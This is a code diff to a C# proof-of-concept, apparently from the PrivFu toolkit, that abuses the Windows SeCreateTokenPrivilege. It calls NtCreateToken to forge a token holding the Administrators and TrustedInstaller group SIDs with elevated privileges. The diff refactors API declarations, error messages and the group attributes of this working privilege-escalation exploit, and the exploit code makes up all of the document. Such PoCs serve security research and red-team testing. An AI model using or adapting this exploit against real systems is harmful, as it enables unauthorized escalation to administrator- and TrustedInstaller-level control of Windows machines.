@@ -69,7 +69,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         [StructLayout(LayoutKind.Explicit, Size = 8)]
-        public struct LARGE_INTEGER
+        struct LARGE_INTEGER
         {
             [FieldOffset(0)]
             public int Low;
@@ -128,7 +128,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct OBJECT_ATTRIBUTES : IDisposable
+        struct OBJECT_ATTRIBUTES : IDisposable
         {
             public int Length;
             public IntPtr RootDirectory;
@@ -211,7 +211,7 @@ namespace SeCreateTokenPrivilegePoC
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct SID_AND_ATTRIBUTES
+        struct SID_AND_ATTRIBUTES
         {
             public IntPtr Sid; // PSID
             public uint Attributes;
@@ -284,13 +284,14 @@ namespace SeCreateTokenPrivilegePoC
             public LUID SourceIdentifier;
         }
 
+        [StructLayout(LayoutKind.Sequential)]
         struct TOKEN_USER
         {
             public SID_AND_ATTRIBUTES User;
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        public struct UNICODE_STRING : IDisposable
+        struct UNICODE_STRING : IDisposable
         {
             public ushort Length;
             public ushort MaximumLength;
@@ -315,28 +316,17 @@ namespace SeCreateTokenPrivilegePoC
             }
         }
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool AllocateAndInitializeSid(
-            ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
-            byte nSubAuthorityCount,
-            uint dwSubAuthority0,
-            uint dwSubAuthority1,
-            uint dwSubAuthority2,
-            uint dwSubAuthority3,
-            uint dwSubAuthority4,
-            uint dwSubAuthority5,
-            uint dwSubAuthority6,
-            uint dwSubAuthority7,
-            out IntPtr pSid);
-
+        /*
+         * advapi32.dll
+         */
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool AllocateLocallyUniqueId(out LUID Luid);
 
         [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
         static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);
 
-        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
-        static extern bool ConvertStringSidToSidA(string StringSid, out IntPtr pSid);
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool GetTokenInformation(
@@ -355,21 +345,21 @@ namespace SeCreateTokenPrivilegePoC
             string lpAccountName,
             IntPtr Sid,
             ref int cbSid,
-            string ReferencedDomainName,
+            StringBuilder ReferencedDomainName,
             ref int cchReferencedDomainName,
             out SID_NAME_USE peUse);
 
         [DllImport("advapi32.dll")]
         static extern bool LookupPrivilegeValue(
-            IntPtr lpSystemName, 
+            IntPtr lpSystemName,
             string lpName,
             ref LUID lpLuid);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool OpenProcessToken(
-            IntPtr ProcessHandle,
-            uint DesiredAccess,
-            out IntPtr TokenHandle);
+        /*
+         * kenel32.dll
+         */
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool CloseHandle(IntPtr hModule);
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
         static extern uint FormatMessage(
@@ -387,9 +377,9 @@ namespace SeCreateTokenPrivilegePoC
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         static extern IntPtr LoadLibrary(string lpFileName);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool CloseHandle(IntPtr hObject);
-
+        /*
+         * ntdll.dll
+         */
         [DllImport("ntdll.dll")]
         static extern void RtlGetNtVersionNumbers(
             ref int MajorVersion,
@@ -424,20 +414,24 @@ namespace SeCreateTokenPrivilegePoC
         const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
         const uint SE_PRIVILEGE_ENABLED = 0x00000002;
         const uint SE_GROUP_ENABLED = 0x00000004;
+        const uint SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002;
+        const uint SE_GROUP_OWNER = 0x00000008;
         const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
         static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
-        static string GetWin32ErrorMessage(int code)
+        static string GetWin32ErrorMessage(int code, bool isNtStatus)
         {
             uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
             uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
             StringBuilder message = new StringBuilder(255);
+            IntPtr pNtdll = IntPtr.Zero;
 
-            IntPtr pNtdll = LoadLibrary("ntdll.dll");
+            if (isNtStatus)
+                pNtdll = LoadLibrary("ntdll.dll");
 
             uint status = FormatMessage(
-                FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM,
+                isNtStatus ? (FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM) : FORMAT_MESSAGE_FROM_SYSTEM,
                 pNtdll,
                 code,
                 0,
@@ -445,7 +439,8 @@ namespace SeCreateTokenPrivilegePoC
                 255,
                 IntPtr.Zero);
 
-            FreeLibrary(pNtdll);
+            if (isNtStatus)
+                FreeLibrary(pNtdll);
 
             if (status == 0)
             {
@@ -459,8 +454,10 @@ namespace SeCreateTokenPrivilegePoC
             }
         }
 
+
         static IntPtr CreatePrivilegedToken()
         {
+            int error;
             LUID authId;
             int MajorVersion = 0;
             int MinorVersion = 0;
@@ -484,49 +481,52 @@ namespace SeCreateTokenPrivilegePoC
             if (!GetCurrentUserSid(out IntPtr pSid))
                 return IntPtr.Zero;
 
-            TOKEN_USER tokenUser = new TOKEN_USER();
+            var tokenUser = new TOKEN_USER();
             tokenUser.User.Attributes = 0;
             tokenUser.User.Sid = pSid;
 
             if (!AllocateLocallyUniqueId(out LUID luid))
             {
+                error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to allocate LUID.");
-                Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
-            TOKEN_SOURCE tokenSource = new TOKEN_SOURCE("PrivFu!!");
+            var tokenSource = new TOKEN_SOURCE("PrivFu!!");
             tokenSource.SourceIdentifier.LowPart = luid.LowPart;
             tokenSource.SourceIdentifier.HighPart = luid.HighPart;
 
             if (!GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges))
                 return IntPtr.Zero;
 
-            if (!ConvertStringSidToSidA(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
+            if (!ConvertStringSidToSid(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
             {
+                error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to get Administrator group SID.");
-                Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
-            if (!ConvertStringSidToSidA(
+            if (!ConvertStringSidToSid(
                 "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
                 out IntPtr pTrustedInstaller))
             {
+                error = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Failed to get Trusted Installer SID.");
-                Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                 return IntPtr.Zero;
             }
 
             IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
             IntPtr pTokenGroups = GetInformationFromToken(
-                hCurrentToken, 
+                hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenGroups);
             IntPtr pTokenPrimaryGroup = GetInformationFromToken(
-                hCurrentToken, 
+                hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenPrimaryGroup);
             IntPtr pTokenDefaultDacl = GetInformationFromToken(
-                hCurrentToken, 
+                hCurrentToken,
                 TOKEN_INFORMATION_CLASS.TokenDefaultDacl);
 
             if (pTokenGroups == IntPtr.Zero ||
@@ -537,13 +537,13 @@ namespace SeCreateTokenPrivilegePoC
                 return IntPtr.Zero;
             }
 
-            TOKEN_GROUPS tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
-                pTokenGroups, 
+            var tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
+                pTokenGroups,
                 typeof(TOKEN_GROUPS));
-            TOKEN_PRIMARY_GROUP tokenPrimaryGroup = (TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(
+            var tokenPrimaryGroup = (TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(
                 pTokenPrimaryGroup,
                 typeof(TOKEN_PRIMARY_GROUP));
-            TOKEN_DEFAULT_DACL tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
+            var tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
                 pTokenDefaultDacl,
                 typeof(TOKEN_DEFAULT_DACL));
 
@@ -553,8 +553,8 @@ namespace SeCreateTokenPrivilegePoC
             for (var i = 0; i < tokenGroups.GroupCount; i++)
             {
                 pSidAndAttributes = new IntPtr(pTokenGroups.ToInt64() + i * sidAndAttrSize + IntPtr.Size);
-                SID_AND_ATTRIBUTES sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
-                    pSidAndAttributes, 
+                var sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
+                    pSidAndAttributes,
                     typeof(SID_AND_ATTRIBUTES));
 
                 ConvertSidToStringSid(sidAndAttributes.Sid, out var sid);
@@ -567,7 +567,9 @@ namespace SeCreateTokenPrivilegePoC
                 else if (sid == SECURITY_WORLD_RID)
                 {
                     sidAndAttributes.Sid = pTrustedInstaller;
-                    sidAndAttributes.Attributes = SE_GROUP_ENABLED;
+                    sidAndAttributes.Attributes = SE_GROUP_ENABLED |
+                        SE_GROUP_ENABLED_BY_DEFAULT |
+                        SE_GROUP_OWNER;
                 }
                 else
                 {
@@ -578,14 +580,18 @@ namespace SeCreateTokenPrivilegePoC
                 Marshal.StructureToPtr(sidAndAttributes, pSidAndAttributes, true);
             }
 
-            TOKEN_OWNER tokenOwner = new TOKEN_OWNER(pSid);
-            LARGE_INTEGER expirationTime = new LARGE_INTEGER(-1L);
+            tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
+                pTokenGroups,
+                typeof(TOKEN_GROUPS));
 
-            SECURITY_QUALITY_OF_SERVICE sqos = new SECURITY_QUALITY_OF_SERVICE(
+            var tokenOwner = new TOKEN_OWNER(pSid);
+            var expirationTime = new LARGE_INTEGER(-1L);
+
+            var sqos = new SECURITY_QUALITY_OF_SERVICE(
                 SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, 0, 0);
-            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
+            var oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
             IntPtr pSqos = Marshal.AllocHGlobal(Marshal.SizeOf(sqos));
-            Marshal.StructureToPtr(sqos, pSqos, true); 
+            Marshal.StructureToPtr(sqos, pSqos, true);
             oa.SecurityQualityOfService = pSqos;
 
             int ntstatus = NtCreateToken(
@@ -606,16 +612,18 @@ namespace SeCreateTokenPrivilegePoC
             if (ntstatus != STATUS_SUCCESS)
             {
                 Console.WriteLine("[-] Failed to create privileged token.");
-                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(ntstatus));
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
                 return IntPtr.Zero;
             }
 
             return hToken;
         }
 
+
         static bool GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges)
         {
-            LUID luid = new LUID();
+            int error;
+            var luid = new LUID();
             int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
             IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);
             string[] privs = new string[] {
@@ -626,7 +634,7 @@ namespace SeCreateTokenPrivilegePoC
             };
 
             tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(
-                pPrivileges, 
+                pPrivileges,
                 typeof(TOKEN_PRIVILEGES));
             tokenPrivileges.PrivilegeCount = 4;
 
@@ -634,8 +642,9 @@ namespace SeCreateTokenPrivilegePoC
             {
                 if (!LookupPrivilegeValue(IntPtr.Zero, privs[idx], ref luid))
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to lookup {0}.");
-                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
+                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                     return false;
                 }
 
@@ -646,8 +655,9 @@ namespace SeCreateTokenPrivilegePoC
             return true;
         }
 
+
         static IntPtr GetInformationFromToken(
-            IntPtr hToken, 
+            IntPtr hToken,
             TOKEN_INFORMATION_CLASS tokenInfoClass)
         {
             bool status;
@@ -675,26 +685,31 @@ namespace SeCreateTokenPrivilegePoC
             return buffer;
         }
 
+
         static bool GetCurrentUserSid(out IntPtr pSid)
         {
-            string currentUser = Environment.UserName;
-            string currentDomain = Environment.UserDomainName;
+            string currentUser = string.Format(
+                "{0}\\{1}",
+                Environment.UserDomainName,
+                Environment.UserName);
             int cbSid = Marshal.SizeOf(typeof(SID));
-            int cchReferencedDomainName = currentDomain.Length;
+            StringBuilder referencedDomainName = new StringBuilder();
+            int cchReferencedDomainName = Environment.UserDomainName.Length;
             bool status;
             int error;
 
-            pSid = Marshal.AllocHGlobal(cbSid);
-            ZeroMemory(pSid, cbSid);
-
             do
             {
+                referencedDomainName.Capacity = cchReferencedDomainName;
+                pSid = Marshal.AllocHGlobal(cbSid);
+                ZeroMemory(pSid, cbSid);
+
                 status = LookupAccountName(
                     IntPtr.Zero,
                     currentUser,
                     pSid,
                     ref cbSid,
-                    currentDomain,
+                    referencedDomainName,
                     ref cchReferencedDomainName,
                     out SID_NAME_USE peUse);
                 error = Marshal.GetLastWin32Error();
@@ -709,9 +724,8 @@ namespace SeCreateTokenPrivilegePoC
                 }
                 else
                 {
+                    referencedDomainName.Clear();
                     Marshal.FreeHGlobal(pSid);
-                    pSid = Marshal.AllocHGlobal(cbSid);
-                    ZeroMemory(pSid, cbSid);
                 }
             } while (!status && error == ERROR_INSUFFICIENT_BUFFER);
 
@@ -724,6 +738,7 @@ namespace SeCreateTokenPrivilegePoC
             return status;
         }
 
+
         static void ZeroMemory(IntPtr buffer, int size)
         {
             byte[] nullBytes = new byte[size];
@@ -734,13 +749,14 @@ namespace SeCreateTokenPrivilegePoC
             Marshal.Copy(nullBytes, 0, buffer, size);
         }
 
+
         static void Main()
         {
             IntPtr hToken = CreatePrivilegedToken();
 
             if (hToken != IntPtr.Zero)
             {
-                Console.WriteLine("[+] Got handle to the elevated token (hFile = 0x{0}).", hToken.ToString("X"));
+                Console.WriteLine("[+] Got handle to the elevated token (hToken = 0x{0}).", hToken.ToString("X"));
                 Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
                 Console.ReadLine();
 
